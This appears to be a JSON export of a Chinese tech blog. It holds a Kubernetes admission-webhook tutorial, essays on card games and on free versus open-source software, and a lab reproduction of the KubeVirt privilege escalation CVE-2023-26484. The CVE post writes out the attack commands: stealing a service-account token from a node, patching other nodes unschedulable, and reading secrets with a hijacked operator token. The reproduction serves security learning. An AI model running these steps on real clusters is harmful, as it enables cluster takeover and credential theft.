假如大家的故事形式都只是小说, 我相信万智牌在讲故事这方面或许还有一战之力, 但是游戏王和宝可梦有了动画, 竞争的维度就变得不一样了, 在处理得当的情况下, 视频影像会大幅度提高一个故事情感渲染的上下限, 即便剧情再怎么糟糕, 人们也会因为那么几个印象深刻的画面而记住这个IP, 随着时间的推移, 动画带来的传播效应会呈现滚雪球式的增加: 老玩家会因为获得滤镜加持, 新玩家同样可以轻松因为画面而发生共情.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e剩下的涉及卡牌平衡性的缺点, 这也引发了我对众多TCG游戏的思考, 包括游戏整体的生命周期以及TCG游戏的意义.\u003c/p\u003e\n\u003ch2 id=\"生命周期\"\u003e生命周期\u003c/h2\u003e\n\u003ch3 id=\"实体苦厄\"\u003e实体苦厄\u003c/h3\u003e\n\u003cp\u003e纵观众多TCG, 万智牌受限于底层费用机制似乎在这方面相对来说做得好一些, 然而问题在于, 作为一个商业产品, 它的第一任务是给公司带来财富, 第二任务才是服务于玩家, 尽管二者在有些时候, 尤其是游戏发展的早期是不冲突的. 从玩家来说, \u003cstrong\u003e游戏本体的运营发展存在两个方向, 一是玩法的扩张, 二是强度的迭代\u003c/strong\u003e, 前者更灵巧更得人心, 后者则由于对已有卡牌的淘汰而常常备受争议. 一般来说, 有经验的卡牌运营商并不着急于强度迭代, 而是优先致力于玩法的扩张, 间或夹杂必要的强度提升, 可惜的是, 近乎固化的底层规则框架决定了玩法的扩张是有边际效应的, \u003cstrong\u003e当扩张玩法的边际效应变得越来越低时, 说明TCG的生命周期已经步入了后半段\u003c/strong\u003e, 然而这与商业产品的第一使命相互冲突, 随之而来的是强度的无限扩张和争议的发生, 在没有新玩法的情况下, 可以预见的是无止境的强度爆炸. 在这点上, 所有商业TCG都面临着同样的问题: 有限的卡牌玩法和无限的公司贪欲与玩家需求引发的主要矛盾.\u003c/p\u003e","title":"卡牌迷思：从万智牌的衰退开始"},{"content":"Deployment and Debugging of Admission Webhook in Kubernetes cluster Intro Dynamic admission control 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了从0到1开发K8S_Webhook最佳实践, 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.\n本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 admission-webhook-example中的v1部分.\n在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).\nDeployment 创建 service account 创建一个用于webhook的service account\nkubectl apply -f deployment/rbac.yaml 创建证书 API Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. 原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了, 主要出问题的地方如下:\n# create server cert/key CSR and send to k8s API cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: ${csrName} spec: groups: - system:authenticated request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) usages: - digital signature - key encipherment - server auth EOF 根据文档, 在1.22以及之后版本的kubernetes中, certificates.k8s.io/v1beta1 已经被抛弃不可用, 需要修改为certificates.k8s.io/v1, 并且需要在spec中增加signerName, signer的作用是签署证书. k8s内置的signerName 有以下几种:\nkubernetes.io/kube-apiserver-client: 签名的证书将被 API 服务器视为客户证书. 许可的密钥用途不能包含 [\u0026quot;digital signature\u0026quot;, \u0026quot;key encipherment\u0026quot;, \u0026quot;client auth\u0026quot;] 之外的键. kubernetes.io/kube-apiserver-client-kubelet: 签名的证书将被 kube-apiserver 视为客户证书. 许可的密钥用途为[\u0026quot;key encipherment\u0026quot;, \u0026quot;digital signature\u0026quot;, \u0026quot;client auth\u0026quot;] 或 [\u0026quot;digital signature\u0026quot;, \u0026quot;client auth\u0026quot;] kubernetes.io/kubelet-serving: 签名服务证书，该服务证书被 API 服务器视为有效的 kubelet 服务证书. 许可的密钥用途为[\u0026quot;key encipherment\u0026quot;, \u0026quot;digital signature\u0026quot;, \u0026quot;server auth\u0026quot;] 或 [\u0026quot;digital signature\u0026quot;, \u0026quot;server auth\u0026quot;] kubernetes.io/legacy-unknown: 不保证信任. 通过原来的证书签名请求的用途可以推断, 我们应该选择kubernetes.io/kubelet-serving作为signer, 而admission webhook在部署后也确实会作为一种服务被API Server调用, 因此在这个调用的过程中, API Server是客户端, 而webhook是服务端, 需要一个服务证书.\n因此经过修改, webhook-create-signed-cert.sh脚本中相应部分应该更改为如下内容:\n# create server cert/key CSR and send to k8s API cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: certificates.k8s.io/v1 kind: CertificateSigningRequest metadata: name: ${csrName} spec: signerName: kubernetes.io/kubelet-serving groups: - system:authenticated request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) usages: - digital signature - key encipherment - server auth EOF 但是这还没完, 在执行脚本后, 我们会发现证书请求虽然通过了, 但是证书并没有签发, 原因可以通过以下命令去查阅:\nkubectl get csr \u0026lt;csr-name\u0026gt; -o yaml 在输出中的status可以发现错误原因, 经过查阅, 可以从官方文档和相关的github issue中发现是csr创建时候填的内容有问题, 脚本在创建csr的时候使用的命令是:\nopenssl genrsa -out ${tmpdir}/server-key.pem 2048 openssl req -new -key ${tmpdir}/server-key.pem -subj \u0026#34;/CN=${service}.${namespace}.svc\u0026#34; -out ${tmpdir}/server.csr -config ${tmpdir}/csr.conf 但是文档中提到, kubernetes.io/kubelet-serving签名者规定, 许可的主体组织名必须是 [\u0026quot;system:nodes\u0026quot;], 用户名必须以 system:node: 开头, 那么经过略微修改, 正确的命令如下:\nopenssl genrsa -out ${tmpdir}/server-key.pem 2048 openssl req -new -key ${tmpdir}/server-key.pem -subj \u0026#34;/CN=system:node:${service}.${namespace}.svc/O=system:nodes\u0026#34; -out ${tmpdir}/server.csr -config ${tmpdir}/csr.conf (这个CN的名字我不知道这么改行不行, 反正不影响后续的操作\u0026hellip;)\n重新执行脚本就可以了, 可以通过kubectl get csr \u0026lt;csr-name\u0026gt; 看到证书已经Issue了.\n创建Service 有了证书自然要有相应的域名和服务, 在集群内部, 这样的服务就通过Service资源来创建. 然后部署相应的Deployment\nkubectl apply -f deployment/service.yaml kubectl apply -f deployment/deployment.yaml 这个Deployment中包含了ValidatingAdmissionWebhook和MutatingAdmissionWebhook的代码, 他们通过不同的路由得到触发.\n// main.go mux := http.NewServeMux() mux.HandleFunc(\u0026#34;/mutate\u0026#34;, whsvr.serve) mux.HandleFunc(\u0026#34;/validate\u0026#34;, whsvr.serve) whsvr.server.Handler = mux 注册ValidatingAdmissionWebhook 执行webhook-patch-ca-bundle.sh来对validatingwebhook.yaml进行patch, 替换其中的${CA_BUNDLE}变量, 观察这个模板文件, 可以发现他注册的是 admission-webhook-example-svc 的 /validate 路由, 并专门在deployments和services资源的创建的时候对创建行为进行验证, 此外, matchLabels 部分规定了只有namespace有admission-webhook-example: enabled 这样的label的时候, 这个webhook才会被这个namespace中的行为触发.\napiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: name: validation-webhook-example-cfg labels: app: admission-webhook-example webhooks: - name: required-labels.qikqiak.com clientConfig: service: name: admission-webhook-example-svc namespace: default path: \u0026#34;/validate\u0026#34; caBundle: ${CA_BUNDLE} rules: - operations: [\u0026#34;CREATE\u0026#34;] apiGroups: [\u0026#34;apps\u0026#34;, \u0026#34;\u0026#34;] apiVersions: [\u0026#34;v1\u0026#34;] resources: [\u0026#34;deployments\u0026#34;, \u0026#34;services\u0026#34;] namespaceSelector: matchLabels: admission-webhook-example: enabled 我对这个caBundle有点好奇, 查了查, 这个caBundle是用于校验 Webhook 的服务器证书, 类似于访问网站时候的信任根证书.\n验证 如上所说, 给default添加label\nkubectl label namespace default admission-webhook-example=enabled 然后部署测试用例sleep.yaml, 会发现部署失败了, 因为没有需要的labels, 这部分逻辑可以去翻翻webhook.go中的代码, 说明webhook确实处理了资源创建请求.\n接着, 用sleep-no-validation.yaml 执行创建操作成功, 因为设置了一个admission-webhook-example.qikqiak.com/validate: \u0026quot;false\u0026quot; 告诉webhook不要验证 . sleep-with-labels.yaml也可以创建成功, 原因是加上了对应的标签.\n注册MutatingAdmissionWebhook 和注册ValidatingAdmissionWebhook类似, 这里省略\nDebugging Debugging webhook的思路是这样的: 在本地方便调试的环境中跑webhook的golang代码, 然后将这个webhook服务注册为集群内的一个外部Endpoints.\n在下面的操作之前, 先按照类似的步骤使用debug文件下的yaml文件执行和部署时相同的操作. (注意, debug/webhook-create-signed-cert.sh最后几行导出证书的步骤可以注释掉来自己手动导出)\n运行 前面提过, webhook被调用需要它有服务端的证书, 因此我们将服务端的证书导出来, 并修改main.go中证书的路经, 这里我将cert.pem和key.pem都放在了与代码相同的目录下面\nkubectl get secret ${secret} -o json | jq -r \u0026#39;.data.\u0026#34;key.pem\u0026#34;\u0026#39; | base64 -d \u0026gt; key.pem kubectl get secret ${secret} -o json | jq -r \u0026#39;.data.\u0026#34;cert.pem\u0026#34;\u0026#39; | base64 -d \u0026gt; cert.pem flag.IntVar(\u0026amp;parameters.port, \u0026#34;port\u0026#34;, 443, \u0026#34;Webhook server port.\u0026#34;) // flag.StringVar(\u0026amp;parameters.certFile, \u0026#34;tlsCertFile\u0026#34;, \u0026#34;/etc/webhook/certs/cert.pem\u0026#34;, \u0026#34;File containing the x509 Certificate for HTTPS.\u0026#34;) // flag.StringVar(\u0026amp;parameters.keyFile, \u0026#34;tlsKeyFile\u0026#34;, \u0026#34;/etc/webhook/certs/key.pem\u0026#34;, \u0026#34;File containing the x509 private key to --tlsCertFile.\u0026#34;) flag.StringVar(\u0026amp;parameters.certFile, \u0026#34;tlsCertFile\u0026#34;, \u0026#34;cert.pem\u0026#34;, \u0026#34;File containing the x509 Certificate for HTTPS.\u0026#34;) flag.StringVar(\u0026amp;parameters.keyFile, \u0026#34;tlsKeyFile\u0026#34;, \u0026#34;key.pem\u0026#34;, \u0026#34;File containing the x509 private key to --tlsCertFile.\u0026#34;) 直接go run .运行即可, 记得给一下权限.\n注册 打开debug/service.yaml, 内容如下:\napiVersion: v1 kind: Service metadata: name: admission-webhook-example-svc-debug spec: ports: - port: 443 targetPort: 443 --- apiVersion: v1 kind: Endpoints metadata: name: admission-webhook-example-svc-debug subsets: - addresses: - ip: 192.168.58.1 ports: - port: 443 可以看到这里手动创建了一个endpoints来指向外部(这里是我的宿主机)的admission-webhook服务, 并且依旧使用Service资源来接收API Server的调用请求, API Server的调用请求会发送给service的443端口, service随即将请求发送给endpoints的443端口, 也就是跑在宿主机上的webhook服务. 读者自己操作的时候要记得将192.168.58.1替换为自己webhook服务所在的宿主机的对应ip.\n然后尝试部署sleep.yaml, 会发现webhook这边有相应的输出了.\n到此为止, 我们已经可以在自己的本地环境中运行admission-webhook并让集群来调用它了, 如何Debug? 打开vscode下断点运行就好了\n最后一点, 非常推荐vscode的kubernetes插件, 对于开发人员查看集群信息和日志都有很大帮助, 不再需要疯狂敲kubectl logs 命令了.\n总结 这次实践下来, 发现静下心来阅读官方文档真的是非常重要的能力, 不要过度依赖chatgpt, 后者在我纠正证书错误期间一直让我把signerName写成 kubernetes.io/apiserver-serving 这个不知道是什么的东西, 让我白白浪费了很久的时间, 直到我慢慢读官方文档才发现这个错误.\n所以静下心来去阅读那些看起来很难的东西, 是最节省时间的方法.\n","permalink":"https://ch3n9w.github.io/posts/tech-kubernetes-webhook/","summary":"\u003ch1 id=\"deployment-and-debugging-of-admission-webhook-in-kubernetes-cluster\"\u003eDeployment and Debugging of Admission Webhook in Kubernetes cluster\u003c/h1\u003e\n\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"uhttps://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllersrl\"\u003eDynamic admission control\u003c/a\u003e 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了\u003ca href=\"https://zhuanlan.zhihu.com/p/404764407\"\u003e从0到1开发K8S_Webhook最佳实践\u003c/a\u003e, 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.\u003c/p\u003e\n\u003cp\u003e本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 \u003ca href=\"https://github.com/scriptwang/admission-webhook-example\"\u003eadmission-webhook-example\u003c/a\u003e中的v1部分.\u003c/p\u003e\n\u003cp\u003e在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).\u003c/p\u003e\n\u003ch2 id=\"deployment\"\u003eDeployment\u003c/h2\u003e\n\u003ch3 id=\"创建-service-account\"\u003e创建 service account\u003c/h3\u003e\n\u003cp\u003e创建一个用于webhook的service account\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f deployment/rbac.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"创建证书\"\u003e创建证书\u003c/h3\u003e\n\u003cp\u003eAPI Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. \u003cstrong\u003e原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了\u003c/strong\u003e, 主要出问题的地方如下:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create  server cert/key CSR and  send to k8s API\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF | kubectl create -f -\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eapiVersion: certificates.k8s.io/v1beta1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ekind: CertificateSigningRequest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  name: ${csrName}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  groups:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - system:authenticated\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  usages:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - digital signature\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - key encipherment\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - server auth\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e根据文档, 在1.22以及之后版本的kubernetes中, \u003ccode\u003ecertificates.k8s.io/v1beta1\u003c/code\u003e 已经被抛弃不可用, 需要修改为\u003ccode\u003ecertificates.k8s.io/v1\u003c/code\u003e, 并且需要在\u003ccode\u003espec\u003c/code\u003e中增加\u003ccode\u003esignerName\u003c/code\u003e, signer的作用是签署证书. k8s内置的\u003ccode\u003esignerName\u003c/code\u003e 有以下几种:\u003c/p\u003e","title":"Kubernetes Admission Webhook 部署和调试"},{"content":"该漏洞是论文工作 \u0026ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications\u0026rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.\nCVE-2023-26484 Kubevirt 权限提升漏洞 简介 KubeVirt 是 Kubernetes 的虚拟机管理插件. 在 0.59.0 及之前的版本中, 如果恶意用户接管了运行 virt-handler 的 Kubernetes 节点, 则 virt-handler 服务账户可用于修改所有节点.这可被滥用于诱骗系统级特权组件. 这样, 被入侵的节点就可以被用来提升节点之外的权限, 直到可能拥有对整个集群的完全权限访问. 一旦用户可以入侵特定节点, 最简单的利用方法就是使用 virt-handler 服务账户将所有其他节点设置为不可调度, 然后等待具有高权限的系统关键组件出现在其节点上.\n环境搭建 参考kubevirt的官网安装\nexport VERSION=\u0026#34;v0.59.0\u0026#34; kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-operator.yaml kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-cr.yaml 复现 从简介中就可以对这个漏洞的作用机理有一个大概的了解, 那么复现的步骤大致分为以下步骤:\n获取一个节点的权限, 上面有virt-handler, 由于virt-handler是Daemonsets资源, 因此一定存在 拿到virt-handler的SA Token, 然后向API Server发送请求去 patch 其他节点, 让新创建的容器无法被调度到这些节点上 删除其他节点上的高权限pod, 在这个漏洞中, 我们可以利用virt-operator pod, 它的cluster role具有list 和 get secret的权限 等待高权限pod被重新创建到攻击者控制的节点上 使用高权限pod的SA, 获取集群权限 为了复现完整的流程, 最开始的时候让virt-operator不要出现在自己的节点上. 由于我复现用的集群有三个节点, 而virt-operator的默认replicas是2, 因此修改kubevirt-operator.yaml中的相应选项并apply, 最后得到\nNAME READY STATUS RESTARTS AGE virt-api-695695c8bf-9jsjk 1/1 Running 1 (129m ago) 23d virt-api-695695c8bf-fljvr 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-q7vf8 1/1 Running 1 (129m ago) 23d virt-controller-6b8dbbd8c5-x8jcb 1/1 Running 1 (129m ago) 23d virt-handler-j4qkf 1/1 Running 1 (129m ago) 23d virt-handler-ncpwp 1/1 Running 1 (129m ago) 23d virt-operator-5d5bdf9c5b-lzsmr 1/1 Running 2 (129m ago) 23d 接下来, 登录没有virt-operator的节点来模拟攻击者控制该节点的场景. 我的集群使用containerd作为容器引擎, 查看节点上的容器\n❯ ctr -n k8s.io c ls CONTAINER IMAGE RUNTIME 018b6f216241def706bf49b2cbe0136d26a9440ec44fba5ff9158f9c64449f77 registry.k8s.io/pause:3.6 io.containerd.runc.v2 03bc2c88f4e7f0b748cbff9e74469886125ec7857385750dd6962547fc2c94dd registry.k8s.io/pause:3.6 io.containerd.runc.v2 2e34f1411a95334edbb18df3bfd6dd860c8369d19eb41efef66fd4aa75664ef7 registry.k8s.io/pause:3.6 io.containerd.runc.v2 3cad963e8764d3b57754dc8723e2dce8e7793c388b9a74083fd54ced88595ae3 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 3df18a38c2398324f3836bb0fbe99f55775f641559fde6a9f57247d9d13be913 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 45a7feb9dabff6a8200ccf37f6da7c01d7f689b866127921f1b1c37d825fdeda quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 4db25b7315ee957434ce455fd8de25c499e83ad521cb53f125fa436e5b50ad22 quay.io/kubevirt/virt-api:v0.59.0 io.containerd.runc.v2 5c26a0f3b233eadb1f46382def64ee0401b8cc19c1dda80f60ad131b1e3f821d registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 688a35b84fc0ce7bd68e02928eb4e22728559e41977a4d2a5e108f6865c5f3c6 quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 6e6eab0c1ede3d083283f8d96758bc898a81ceb472349e04a38c3bf6042c3bfb quay.io/kubevirt/virt-controller:v0.59.0 io.containerd.runc.v2 836f05ead0f47d570373917f2315111a85104c36e2e2f700aa5949dac1963ec6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f26e2c39123230330328ab931a517d334c83d92dad0b637c6522217cf7d9482 registry.k8s.io/pause:3.6 io.containerd.runc.v2 8f4c6b146eeea6b6f994f2deb5adc6d938ec79afb00cb71e7491b8b6e98359f6 registry.k8s.io/pause:3.6 io.containerd.runc.v2 90cc829dd1102778df74b9616dcef5061476d4a2b04660ee9ba23f34fbfdbaab quay.io/kubevirt/virt-launcher:v0.59.0 io.containerd.runc.v2 a4b93524451f68c41efa103e432622113c4909979c5d7ac538eede7455b6bfaa registry.k8s.io/kube-proxy:v1.25.16 io.containerd.runc.v2 b23ac35d5a9639ec75a923af74b9f6ed571c89a9a59ad037424fb829a39a73f1 docker.io/flannel/flannel-cni-plugin:v1.4.0-flannel1 io.containerd.runc.v2 bc71642c1b0228d2ed22e92c817d1eed581ef6179e25da5ba14b69df43251166 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 c47082251d14b8e743d41ace290bd64923b704afb9e4e9193d7ad2e6b120f176 quay.io/kubevirt/virt-handler:v0.59.0 io.containerd.runc.v2 c64079c284e3ce04c261ef192bb1a29a341f0e359dd8c0f0f5678748beaac846 registry.k8s.io/pause:3.6 io.containerd.runc.v2 ce128301b8f46a6e68711355780ff22389507e62b19ae987cbe6fdbda7fbdc58 registry.k8s.io/pause:3.6 io.containerd.runc.v2 d80cb0fc9991d5a0ba8bf565cd1ddc94273cfb50c2b56fb883f455193a1cab00 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e253d834e57f7ee5ae3116e5e922aac2efda2e4475bf79de044b71666191f0c2 registry.k8s.io/pause:3.6 io.containerd.runc.v2 e983fef8d9a9556f82c81008e8efbfcd432781c48c078db6d36ef72650d0f6e4 docker.io/flannel/flannel:v0.24.3 io.containerd.runc.v2 然后要找virt-handler的sa token, 在这次复现中, sa token的位置在/var/lib/kubelet/pods/3b42aafd-8696-4077-a903-6f575e7c4784/volumes/kubernetes.io~projected/kube-api-access-dc92g 下面, 然后使用这个token对其他节点进行patch\ncurl -k -X PATCH -H \u0026#34;Authorization: Bearer \u0026lt;sa-token\u0026gt;\u0026#34; \\ -H \u0026#34;Content-Type: application/json-patch+json\u0026#34; \\ -d \u0026#39;[{\u0026#34;op\u0026#34;: \u0026#34;replace\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/spec/unschedulable\u0026#34;, \u0026#34;value\u0026#34;: true}]\u0026#39; \\ \u0026#34;https://\u0026lt;api-server-address\u0026gt;/api/v1/nodes/\u0026lt;node\u0026gt;\u0026#34; 然后手动删除virt-operator\nkubectl delete po virt-operator-5d5bdf9c5b-lzsmr 稍等片刻就可以看到virt-operator重新出现在了我们控制的节点上, 使用命令来查看sa token的具体位置\nctr -n k8s.io c ls ctr -n k8s.io c info \u0026lt;container-id\u0026gt; 然后用这个token去查看secrets, 以kubevirt中的secrets为例, 发送请求即可读取.\ncurl -k -H \u0026#34;Authorization: Bearer \u0026lt;sa-token\u0026gt;\u0026#34; https://192.168.59.101:6443/api/v1/namespaces/kubevirt/secrets 修复 限制了operator对secret的访问范围, 修复的commit\n","permalink":"https://ch3n9w.github.io/posts/sec-cve-2023-26484/","summary":"\u003cp\u003e该漏洞是论文工作 \u0026ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications\u0026rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.\u003c/p\u003e","title":"CVE-2023-26484 Kubevirt 权限提升漏洞复现"},{"content":"借着\u0026quot;若为自由故\u0026quot;这本书, 读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用\u0026quot;Open-source\u0026quot;而不是\u0026quot;Free\u0026quot;这个词, 不仅能够直观清晰地表达信息, 也能避免\u0026quot;Free\u0026quot;这个单词常用的\u0026quot;免费\u0026quot;之意 (为了人们认识到\u0026quot;Free software\u0026quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.\n具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以\u0026quot;人的自由\u0026quot;为中心, 任何限制软件用户这些权利的个人和组织都是\u0026quot;邪恶\u0026quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: \u0026ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它\u0026rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.\n两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.\n在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知道, Stallman的攻击目标, 可不仅仅是个人计算机中的专有软件, 任何非自由软件, 不管是汽车上的, 飞机上的, 动车上的, 乃至收音机里的, 都是他的抵制对象. 而对于没有资源的普通人来说, 单是找一台彻头彻尾源码可见(指主板上的固件)的笔记本电脑, 就已经是一件非常困难且完全没有性价比的事情了.\n从我的角度来看, 虽然很遗憾, 但是自开源运动成长起来后, 自由软件存在的意义就没有以前那么大了, 甚至说的不客气一些, 微乎其微. 这是需要联系历史背景来看的, 在自由软件运动诞生的那个年代, 软件行业极度闭塞, 互联网才刚刚诞生, 各个公司都在自己蒙头闭门造车, 极尽所能保护自家的代码不被公开, 相互之间更不用说有什么兼容合作了. 自由软件的诞生是对那个封闭环境的一种彻头彻尾的反叛, 它以一种偏激的姿态在软件行业逐渐打动了一批人, 也培养起了别具一格更加开放的文化.\n但是很遗憾, 自由从不局限于某一单一领域, Stallman 和 fsf 一直以来都在强调在软件方面的公民自由, 但忽视了对这种自由的争取可能会干扰甚至阻碍公民在其他领域的自由. 举一个再简单不过的直观例子: 一个身无分文的软件程序员, 凭什么要为了所谓的软件自由去拒绝谷歌的Offer, 要知道, 他要放弃的, 要么是软件自由, 要么是摆脱贫困的自由, 二者孰轻孰重, 恐怕不言自明. 这或许也是Stallman多年以来在运动过程中的聪明所在: 他宣传, 但从不强制.\n古人有云: 君子不器, 强调了君子不能停留在器具这种表象而更应该注重内在修养. 然而讽刺的是, 以自由为纲的fsf, 在常年与商业公司在道德层面的争锋相对中分散了太多精力, 这种围绕着\u0026quot;器\u0026quot;的道德较量最终让他们错过了开发GNU操作系统内核的机会, 多年以来被外界冷嘲热讽. 相反, 以Linus为代表的开源运动选择拒绝将政治激情与冷冰冰的代码绑定, 将软件代码从道德包袱中解放出来, 开启了Linux系统和新兴黑客文化的狂飙发展.\n总结来看, 开源运动是对自由软件的一种修正, 是将后者中的政治激情剔除后的更加适应商业社会的产物. 但是, 就个人来说, 我依旧尊敬这位以一己之力在上个世纪抗衡整个商业世界的传奇黑客, 毫无疑问, 他和其他自由软件运动的参与者一起开创了一个时代, 而他们的遗产, GPL协议, 也将永远存在.\n","permalink":"https://ch3n9w.github.io/posts/read-free-opensource/","summary":"\u003cp\u003e借着\u0026quot;若为自由故\u0026quot;这本书, 